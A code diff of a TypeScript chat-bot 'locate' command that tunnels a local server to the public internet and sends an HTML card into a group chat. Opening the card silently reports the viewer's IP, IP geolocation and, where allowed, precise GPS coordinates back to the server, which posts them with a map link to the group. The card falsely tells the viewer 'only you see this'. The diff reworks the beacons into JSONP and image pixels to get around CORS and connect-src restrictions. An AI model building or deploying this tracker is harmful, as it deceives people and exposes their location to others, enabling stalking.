@@ -1,19 +1,14 @@
 import { randomUUID } from "node:crypto";
-import { spawn } from "node:child_process";
+import { spawn, execFileSync } from "node:child_process";
 import { createServer, type Server } from "node:http";
+import { promises as fs, existsSync, mkdirSync } from "node:fs";
+import path from "node:path";
 import type { CommandContext } from "../../types/index.d.ts";
 import { fytBold } from "../../core/socketText.ts";
 
 /* ───────────────────────── store ───────────────────────── */
 
-type LocateSession = {
-  id: string;
-  group: string;
-  author: string;
-  msg: any;
-  hits: Set<string>;
-  createdAt: number;
-};
+type LocateSession = { id: string; group: string; author: string; msg: any; hits: Set<string>; createdAt: number };
 
 const G = globalThis as any;
 const sessions: Map<string, LocateSession> = (G.__locSessions ??= new Map());
@@ -31,25 +26,70 @@ function sweep() {
 }
 
 function maskIp(ip: string) {
-  if (!ip) return "—";
   const v4 = ip.split(".");
-  return v4.length === 4 ? `${v4[0]}.${v4[1]}.${v4[2]}.*` : ip;
+  return v4.length === 4 ? `${v4[0]}.${v4[1]}.${v4[2]}.*` : ip || "—";
+}
+
+/* ───────────────────────── cloudflared ───────────────────────── */
+
+const BIN_DIR = path.join(process.cwd(), ".locate");
+const BIN = path.join(BIN_DIR, process.platform === "win32" ? "cloudflared.exe" : "cloudflared");
+
+function assetName(): string | null {
+  const a = process.arch;
+  if (process.platform === "linux") {
+    if (a === "x64") return "cloudflared-linux-amd64";
+    if (a === "arm64") return "cloudflared-linux-arm64";
+    if (a === "arm") return "cloudflared-linux-arm";
+    return null;
+  }
+  if (process.platform === "win32") return a === "ia32" ? "cloudflared-windows-386.exe" : "cloudflared-windows-amd64.exe";
+  if (process.platform === "darwin") return a === "arm64" ? "cloudflared-darwin-arm64.tgz" : "cloudflared-darwin-amd64.tgz";
+  return null;
+}
+
+async function ensureBinary(): Promise<string | null> {
+  if (existsSync(BIN)) return BIN;
+  const name = assetName();
+  if (!name) return null;
+
+  if (!existsSync(BIN_DIR)) mkdirSync(BIN_DIR, { recursive: true });
+
+  try {
+    const url = `https://github.com/cloudflare/cloudflared/releases/latest/download/${name}`;
+    const r = await fetch(url, { redirect: "follow" });
+    if (!r.ok) return null;
+    const buf = Buffer.from(await r.arrayBuffer());
+    if (buf.length < 100_000) return null;
+
+    if (name.endsWith(".tgz")) {
+      const tmp = path.join(BIN_DIR, "cf.tgz");
+      await fs.writeFile(tmp, buf);
+      execFileSync("tar", ["-xzf", tmp, "-C", BIN_DIR], { stdio: "ignore" });
+      await fs.unlink(tmp).catch(() => undefined);
+      await fs.chmod(BIN, 0o755).catch(() => undefined);
+    } else {
+      await fs.writeFile(BIN, buf);
+      await fs.chmod(BIN, 0o755).catch(() => undefined);
+    }
+    console.log("[locate] cloudflared listo");
+    return BIN;
+  } catch {
+    return null;
+  }
 }
 
 /* ───────────────────────── túnel ───────────────────────── */
 
-const SSH_OPTS = [
-  "-o", "StrictHostKeyChecking=no",
-  "-o", "UserKnownHostsFile=/dev/null",
-  "-o", "ServerAliveInterval=30",
-  "-o", "ExitOnForwardFailure=yes",
-];
+const SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ServerAliveInterval=30", "-o", "ExitOnForwardFailure=yes"];
 
 type Provider = { cmd: string; args: string[]; re: RegExp };
 
-function provider(name: string): Provider | null {
+function provider(name: string, bin: string | null): Provider | null {
   const npx = process.platform === "win32" ? "npx.cmd" : "npx";
   switch (name) {
+    case "cf":
+      return bin ? { cmd: bin, args: ["tunnel", "--url", `http://127.0.0.1:${PORT}`, "--no-autoupdate"], re: /https:\/\/[a-z0-9-]+\.trycloudflare\.com/i } : null;
     case "lhr":
       return { cmd: "ssh", args: [...SSH_OPTS, "-R", `80:localhost:${PORT}`, "nokey@localhost.run"], re: /https:\/\/[a-z0-9-]+\.lhr\.life/i };
     case "lt":
@@ -61,32 +101,47 @@ function provider(name: string): Provider | null {
   }
 }
 
-const tunnel = (G.__locTunnel ??= { url: "", proc: null as any, tries: 0, order: ["lhr", "lt", "serveo"] as string[] });
+const tunnel = (G.__locTunnel ??= { url: "", proc: null as any, tries: 0, order: ["cf", "lhr", "lt", "serveo"] as string[] });
 
 function baseUrl() {
   const manual = (process.env.LOCATE_BASE_URL || "").replace(/\/+$/, "");
   return manual || tunnel.url;
 }
 
-function startTunnel(): Promise<string> {
-  if (baseUrl()) return Promise.resolve(baseUrl());
+function killTunnel() {
+  try { tunnel.proc?.kill("SIGKILL"); } catch {}
+  tunnel.proc = null;
+  tunnel.url = "";
+}
+
+async function alive(url: string) {
+  try {
+    const c = new AbortController();
+    const t = setTimeout(() => c.abort(), 4000);
+    const r = await fetch(`${url}/__hc`, { signal: c.signal });
+    clearTimeout(t);
+    return r.ok;
+  } catch {
+    return false;
+  }
+}
+
+function startTunnel(bin: string | null): Promise<string> {
   if (tunnel.proc) {
     return new Promise((r) => {
-      const t = setInterval(() => {
-        if (tunnel.url || tunnel.tries > 8) { clearInterval(t); r(tunnel.url); }
-      }, 300);
+      const t = setInterval(() => { if (tunnel.url || tunnel.tries > 8) { clearInterval(t); r(tunnel.url); } }, 300);
     });
   }
 
   const forced = process.env.LOCATE_TUNNEL;
   const name = forced && forced !== "auto" ? forced : tunnel.order[tunnel.tries % tunnel.order.length];
-  const p = provider(name);
-  if (!p) return Promise.resolve("");
+  const p = provider(name, bin);
+  if (!p) { tunnel.tries++; return Promise.resolve(""); }
 
   return new Promise((resolve) => {
     let done = false;
     let child: any;
-    try { child = spawn(p.cmd, p.args, { stdio: ["ignore", "pipe", "pipe"] }); } catch { return resolve(""); }
+    try { child = spawn(p.cmd, p.args, { stdio: ["ignore", "pipe", "pipe"] }); } catch { tunnel.tries++; return resolve(""); }
     tunnel.proc = child;
 
     const finish = (v: string) => { if (done) return; done = true; clearTimeout(timer); resolve(v); };
@@ -103,49 +158,47 @@ function startTunnel(): Promise<string> {
 
     child.stdout?.on("data", onData);
     child.stderr?.on("data", onData);
-
-    child.on("exit", () => {
-      if (tunnel.proc === child) { tunnel.proc = null; tunnel.url = ""; }
-      if (!done) { tunnel.tries++; finish(""); }
-    });
+    child.on("exit", () => { if (tunnel.proc === child) { tunnel.proc = null; tunnel.url = ""; } if (!done) { tunnel.tries++; finish(""); } });
     child.on("error", () => { tunnel.proc = null; tunnel.tries++; finish(""); });
 
     const timer = setTimeout(() => {
       if (!tunnel.url) { try { child.kill("SIGKILL"); } catch {} tunnel.proc = null; tunnel.tries++; finish(""); }
-    }, 18000);
+    }, 22000);
   });
 }
 
 async function ensureTunnel(): Promise<string> {
-  if (baseUrl()) return baseUrl();
-  for (let i = 0; i < 3; i++) {
-    const url = await startTunnel();
-    if (url) return url;
-    await new Promise((r) => setTimeout(r, 900));
+  if (baseUrl() && tunnel.proc && (await alive(baseUrl()))) return baseUrl();
+
+  killTunnel();
+  const bin = await ensureBinary();
+
+  for (let i = 0; i < 4; i++) {
+    const url = await startTunnel(bin);
+    if (!url) { await new Promise((r) => setTimeout(r, 700)); continue; }
+    if (await alive(url)) return url;
+    killTunnel();
   }
   return "";
 }
 
 /* ───────────────────────── servidor ───────────────────────── */
 
-const CORS: Record<string, string> = {
-  "Access-Control-Allow-Origin": "*",
-  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
-  "Access-Control-Allow-Headers": "Content-Type, Bypass-Tunnel-Reminder",
-};
-
 function clientIp(req: any) {
-  const fwd = String(req.headers["x-forwarded-for"] || "").split(",")[0].trim();
-  return (fwd || req.socket.remoteAddress || "").replace(/^::ffff:/, "");
+  const h = req.headers || {};
+  const raw = h["cf-connecting-ip"] || h["x-real-ip"] || String(h["x-forwarded-for"] || "").split(",")[0].trim() || req.socket.remoteAddress || "";
+  const ip = String(raw).replace(/^::ffff:/, "").trim();
+  return ip === "::1" || ip === "127.0.0.1" ? "" : ip;
 }
 
 async function geoFromIp(ip: string) {
   try {
-    const r = await fetch(`https://ipapi.co/${ip}/json/`, { headers: { "User-Agent": "locate-bot" } });
+    const url = ip ? `https://ipapi.co/${ip}/json/` : "https://ipapi.co/json/";
+    const r = await fetch(url, { headers: { "User-Agent": "locate-bot" } });
     if (!r.ok) return null;
     const j: any = await r.json();
     if (!j || j.error) return null;
-    return { city: j.city, region: j.region, country: j.country_name, lat: j.latitude, lon: j.longitude };
+    return { ip: j.ip, city: j.city, region: j.region, country: j.country_name, lat: j.latitude, lon: j.longitude };
   } catch {
     return null;
   }
@@ -162,98 +215,82 @@ async function announce(s: LocateSession, ip: string, lat: number, lon: number, 
   const place = [city, region, country].filter(Boolean).join(", ") || "desconocido";
   const text =
     `📍 *${place}*\n` +
-    `\`${MASK ? maskIp(ip) : ip}\`\n` +
+    `\`${MASK ? maskIp(ip) : ip || "local"}\`\n` +
     `https://maps.google.com/?q=${lat},${lon}` +
     (src === "gps" ? `\n_precisión ±${acc} m_` : "");
 
   await sock.sendMessage(s.group, { text, mentions: [s.author] }, { quoted: s.msg }).catch(() => undefined);
 }
 
-async function resolve(req: any, sid: string) {
-  const s = sessions.get(sid);
-  if (!s) return null;
-  const ip = clientIp(req);
-  const geo = await geoFromIp(ip);
-  return { s, ip, geo };
+function send(res: any, code: number, type: string, body: any) {
+  res.writeHead(code, { "Content-Type": type, "Cache-Control": "no-store", "Access-Control-Allow-Origin": "*" });
+  res.end(body);
 }
 
 async function handle(req: any, res: any) {
-  Object.entries(CORS).forEach(([k, v]) => res.setHeader(k, v));
-  if (req.method === "OPTIONS") return res.writeHead(204).end();
-
   const url = new URL(req.url || "/", `http://${req.headers.host || "localhost"}`);
-  const path = url.pathname;
+  const pathname = url.pathname;
 
-  /* pixel 1x1 — funciona aunque fetch esté bloqueado */
-  const px = path.match(/^\/p\/([A-Za-z0-9_-]{6,48})\.gif$/);
-  if (px) {
-    res.writeHead(200, { "Content-Type": "image/gif", "Cache-Control": "no-store" }).end(GIF);
-    const r = await resolve(req, px[1]);
-    if (r?.geo) await announce(r.s, r.ip, r.geo.lat, r.geo.lon, r.geo.city, r.geo.region, r.geo.country);
+  if (pathname === "/__hc") return send(res, 200, "text/plain", "ok");
+
+  /* script JSONP — sin CORS ni connect-src */
+  const j = pathname.match(/^\/j\/([A-Za-z0-9_-]{6,48})\.js$/);
+  if (j) {
+    const s = sessions.get(j[1]);
+    if (!s) return send(res, 200, "application/javascript", "if(window.__locFail)window.__locFail();");
+    const ip = clientIp(req);
+    const geo = await geoFromIp(ip);
+    if (!geo) return send(res, 200, "application/javascript", "if(window.__locFail)window.__locFail();");
+    send(res, 200, "application/javascript",
+      `window.paint(${JSON.stringify({ ip: MASK ? maskIp(geo.ip || ip) : geo.ip || ip, city: geo.city, region: geo.region, country: geo.country, lat: geo.lat, lon: geo.lon, src: "ip" })});`);
+    await announce(s, geo.ip || ip, geo.lat, geo.lon, geo.city, geo.region, geo.country);
     return;
   }
 
-  /* geo por IP, servido desde el propio host */
-  const g = path.match(/^\/g\/([A-Za-z0-9_-]{6,48})$/);
-  if (g) {
-    const r = await resolve(req, g[1]);
-    if (!r) return res.writeHead(410, { "Content-Type": "application/json" }).end('{"ok":false}');
-    if (!r.geo) return res.writeHead(200, { "Content-Type": "application/json" }).end('{"ok":true,"geo":false}');
-    res.writeHead(200, { "Content-Type": "application/json", "Cache-Control": "no-store" }).end(
-      JSON.stringify({ ok: true, ip: MASK ? maskIp(r.ip) : r.ip, ...r.geo }),
-    );
-    return;
-  }
-
-  /* mapa estático proxyado */
-  const m = path.match(/^\/m\/([A-Za-z0-9_-]{6,48})$/);
+  /* mapa proxyado */
+  const m = pathname.match(/^\/m\/([A-Za-z0-9_-]{6,48})$/);
   if (m) {
     const lat = Number(url.searchParams.get("lat"));
     const lon = Number(url.searchParams.get("lon"));
-    if (!lat || !lon) return res.writeHead(400).end();
-
+    if (!lat || !lon) return send(res, 400, "text/plain", "");
     const key = process.env.GMAPS_KEY;
     const src = key
       ? `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=16&size=600x280&markers=color:red%7C${lat},${lon}&key=${key}`
       : `https://static-maps.yandex.ru/1.x/?ll=${lon},${lat}&z=16&size=600,280&l=map&pt=${lon},${lat},pm2rdm`;
-
     try {
       const up = await fetch(src, { headers: { "User-Agent": "Mozilla/5.0 locate-bot" } });
       const buf = Buffer.from(await up.arrayBuffer());
-      if (!up.ok || buf.length < 200) throw new Error("bad map");
-      res.writeHead(200, { "Content-Type": up.headers.get("content-type") || "image/png", "Cache-Control": "no-store" }).end(buf);
+      if (!up.ok || buf.length < 200) throw new Error();
+      return send(res, 200, up.headers.get("content-type") || "image/png", buf);
     } catch {
-      res.writeHead(302, { Location: `https://maps.google.com/?q=${lat},${lon}` }).end();
+      return send(res, 302, "text/plain", "");
     }
-    return;
   }
 
-  /* GPS desde la tarjeta */
-  const p = path.match(/^\/l\/([A-Za-z0-9_-]{6,48})$/);
-  if (p && req.method === "POST") {
-    const s = sessions.get(p[1]);
-    if (!s) return res.writeHead(410, { "Content-Type": "application/json" }).end('{"ok":false}');
-
-    let raw = "";
-    for await (const chunk of req) { raw += chunk; if (raw.length > 4096) break; }
-    let b: any = {};
-    try { b = JSON.parse(raw || "{}"); } catch {}
-
+  /* GPS por GET + pixel */
+  const l = pathname.match(/^\/l\/([A-Za-z0-9_-]{6,48})$/);
+  if (l) {
+    send(res, 200, "image/gif", GIF);
+    const s = sessions.get(l[1]);
+    if (!s) return;
     const ip = clientIp(req);
-    let lat = Number(b.lat) || 0;
-    let lon = Number(b.lon) || 0;
-    let city = b.city, region = b.region, country = b.country;
+    let lat = Number(url.searchParams.get("lat")) || 0;
+    let lon = Number(url.searchParams.get("lon")) || 0;
+    let city = url.searchParams.get("city") || undefined;
+    let region = url.searchParams.get("region") || undefined;
+    let country = url.searchParams.get("country") || undefined;
+    const acc = Number(url.searchParams.get("acc")) || 0;
+    const src = url.searchParams.get("src") === "gps" ? "gps" : "ip";
     if (!lat || !lon) {
       const geo = await geoFromIp(ip);
-      if (!geo) return res.writeHead(200, { "Content-Type": "application/json" }).end('{"ok":true,"geo":false}');
+      if (!geo) return;
       lat = geo.lat; lon = geo.lon; city = geo.city; region = geo.region; country = geo.country;
     }
-    res.writeHead(200, { "Content-Type": "application/json" }).end('{"ok":true}');
-    await announce(s, ip, lat, lon, city, region, country, b.src === "gps" ? "gps" : "ip", Number(b.acc) || 0);
+    await announce(s, ip, lat, lon, city, region, country, src, acc);
     return;
   }
 
-  res.writeHead(404).end();
+  send(res, 404, "text/plain", "");
 }
 
 function startServer() {
@@ -261,16 +298,12 @@ function startServer() {
   startedRef.current = true;
 
   const server: Server = createServer((req, res) => {
-    handle(req, res).catch(() => { try { res.writeHead(500).end(); } catch {} });
+    handle(req, res).catch(() => { try { send(res, 500, "text/plain", ""); } catch {} });
   });
-
-  server.on("error", (e: any) => {
-    if (e?.code === "EADDRINUSE") console.log(`[locate] puerto ${PORT} ocupado`);
-  });
-
+  server.on("error", (e: any) => { if (e?.code === "EADDRINUSE") console.log(`[locate] puerto ${PORT} ocupado`); });
   server.listen(PORT, () => console.log(`[locate] escuchando :${PORT}`));
   setInterval(sweep, 5 * 60 * 1000).unref?.();
-  process.once("exit", () => { try { tunnel.proc?.kill("SIGKILL"); } catch {} });
+  process.once("exit", killTunnel);
 }
 
 /* ───────────────────────── tarjeta ───────────────────────── */
@@ -308,9 +341,10 @@ body{font-family:-apple-system,'Segoe UI',Roboto,system-ui,sans-serif;background
 <div class="foot"><span>solo tú ves esto</span><span id="st">·</span></div>
 </div></div>
 <script>
-var SID="__SID__",BASE="__BASE__";
-var $=function(i){return document.getElementById(i)};
+var SID="__SID__",BASE="__BASE__",ok=false;
+function $(i){return document.getElementById(i)}
 function paint(d){
+  ok=true;
   $('sub').textContent='Esta es tu ubicación, @__NAME__';
   $('out').innerHTML=
    '<div class="row"><div class="k">IP pública</div><div class="v">'+(d.ip||'—')+'</div></div>'+
@@ -320,37 +354,24 @@ function paint(d){
    '<div class="row"><div class="k">Coordenadas</div><div class="v">'+Number(d.lat).toFixed(5)+', '+Number(d.lon).toFixed(5)+'</div></div>'+
    '<div class="map"><span class="badge">exacto</span><img src="'+BASE+'/m/'+SID+'?lat='+d.lat+'&lon='+d.lon+'&t='+Date.now()+'"></div>';
   $('st').textContent=d.src==='gps'?'GPS':'IP';
+  if(navigator.geolocation&&d.src!=='gps'){
+    navigator.geolocation.getCurrentPosition(function(p){
+      var q='?src=gps&lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&acc='+Math.round(p.coords.accuracy||0)+
+            '&city='+encodeURIComponent(d.city||'')+'&region='+encodeURIComponent(d.region||'')+'&country='+encodeURIComponent(d.country||'');
+      var i=new Image();i.src=BASE+'/l/'+SID+q+'&t='+Date.now();
+      paint({ip:d.ip,city:d.city,region:d.region,country:d.country,lat:p.coords.latitude,lon:p.coords.longitude,src:'gps'});
+    },function(){},{enableHighAccuracy:true,timeout:9000,maximumAge:0});
+  }
 }
-function post(d){
-  try{fetch(BASE+'/l/'+SID,{method:'POST',headers:{'Content-Type':'application/json','Bypass-Tunnel-Reminder':'true'},body:JSON.stringify(d)}).catch(function(){})}catch(e){}
+function __locFail(){
+  if(ok)return;
+  var i=new Image();i.src=BASE+'/l/'+SID+'?t='+Date.now();
+  $('sub').textContent='No se pudo leer la red';
+  $('out').innerHTML='<div class="err">Servicio no disponible.</div>';
 }
-function pixel(){
-  var i=new Image();i.src=BASE+'/p/'+SID+'.gif?t='+Date.now();
-}
-function gps(base){
-  if(!navigator.geolocation)return;
-  navigator.geolocation.getCurrentPosition(function(p){
-    var g={ip:base.ip,city:base.city,region:base.region,country:base.country,lat:p.coords.latitude,lon:p.coords.longitude,acc:Math.round(p.coords.accuracy)||0,src:'gps'};
-    paint(g);post(g);
-  },function(){},{enableHighAccuracy:true,timeout:9000,maximumAge:0});
-}
-function start(){
-  fetch(BASE+'/g/'+SID,{headers:{'Bypass-Tunnel-Reminder':'true'}})
-    .then(function(r){return r.json()})
-    .then(function(d){
-      if(!d||!d.geo||!d.lat){throw 0}
-      var v={ip:d.ip,city:d.city,region:d.region,country:d.country,lat:d.lat,lon:d.lon,src:'ip'};
-      paint(v);post(v);gps(v);
-    })
-    .catch(function(){
-      pixel();
-      $('sub').textContent='No se pudo leer la red';
-      $('out').innerHTML='<div class="err">Servicio no disponible.</div>';
-      gps({ip:'',city:'',region:'',country:''});
-    });
-}
-start();
-</script>`;
+setTimeout(__locFail,9000);
+</script>
+<script src="__BASE__/j/__SID__.js"></script>`;
 
   return {
     view_model: {
@@ -358,10 +379,7 @@ start();
       primitive: {
         __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
         trusted_sources: [o.base],
-        payload: html
-          .replace(/__SID__/g, o.sid)
-          .replace(/__BASE__/g, o.base)
-          .replace(/__NAME__/g, o.name),
+        payload: html.replace(/__SID__/g, o.sid).replace(/__BASE__/g, o.base).replace(/__NAME__/g, o.name),
       },
     },
   };
@@ -387,7 +405,7 @@ export default {
     const base = await ensureTunnel();
     if (!base) {
       await react("❌").catch(() => undefined);
-      await reply(`${fytBold("Sin túnel")}: prueba *LOCATE_TUNNEL=lt* o *serveo*.`).catch(() => undefined);
+      await reply(`${fytBold("Sin túnel")}: revisa que haya red y espacio en disco.`).catch(() => undefined);
       return;
     }
 
